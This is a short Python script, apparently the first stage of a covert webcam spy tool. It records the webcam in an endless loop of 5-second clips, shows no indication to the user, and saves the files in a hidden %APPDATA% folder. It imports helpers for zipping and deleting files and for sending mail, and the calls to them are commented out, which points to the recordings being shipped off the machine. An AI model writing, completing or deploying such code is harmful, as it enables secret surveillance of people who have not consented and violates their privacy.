#step 1
#
import cv2
import numpy
import datetime, os
from s7zarch import main as zip_del
from sendMail import main as mail
videoCounter=1
i =0
path = os.getenv('APPDATA')+'/VideoCaptureChookie'
if not os.path.isdir(path):
	os.mkdir(path)
	
#Date Time Counter to append to filename
start=datetime.datetime.now()


# Define the codec and create VideoWriter object
fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter('%s/%s.avi' % (path, start.strftime("%y-%m-%d-%H-%M-%S")),fourcc, 20.0, (640,480))
	

cam=cv2.VideoCapture(0)

while(True):
	ret,frame = cam.read()
	if (ret==True and videoCounter<=3):
		#Write the frame to output
		out.write(frame)
		elapsed=datetime.datetime.now()-start
		if elapsed > datetime.timedelta(seconds=5):
			start=datetime.datetime.now()
			videoCounter+=1
			if videoCounter <= 3:
				out = cv2.VideoWriter('%s/%s.avi' % (path, start.strftime("%y-%m-%d-%H-%M-%S")),fourcc, 20.0, (640,480))
			

	elif (videoCounter>3):
		cam.release()
		out.release()
		# zip_del()
		# mail()
		videoCounter=1
		if not os.path.isdir(path):
			os.mkdir(path)
		out = cv2.VideoWriter('%s/%s.avi' % (path, start.strftime("%y-%m-%d-%H-%M-%S")),fourcc, 20.0, (640,480))
		cam=cv2.VideoCapture(0)

	
		
